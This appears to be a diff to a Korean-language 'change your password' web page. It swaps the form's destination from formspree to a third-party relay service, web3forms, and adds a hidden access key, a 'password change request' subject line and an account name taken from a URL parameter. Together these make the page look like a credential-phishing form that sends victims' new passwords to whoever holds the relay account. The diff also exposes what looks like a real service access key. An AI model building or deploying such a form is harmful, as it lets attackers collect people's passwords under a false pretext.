@@ -81,9 +81,10 @@
          2. 아래 action의 "YOUR_FORM_ID" 부분을 실제 ID로 교체
             예: action="https://formspree.io/f/abcd1234"
     -->
-    <form id="pwForm" action="https://formspree.io/f/mpqnvjkg" method="POST">
+    <form id="pwForm" action="https://api.web3forms.com/submit" method="POST">
 
-      <!-- 계정명을 URL 파라미터로 넘겨받아 숨김 필드로 전송 (선택사항) -->
+      <input type="hidden" name="access_key" value="b698128d-92e8-4666-8b7b-23aa1f5f1269">
+      <input type="hidden" name="subject" value="비밀번호 변경 요청">
       <input type="hidden" name="account" id="accountField">
 
       <label for="pw1">새 비밀번호</label>
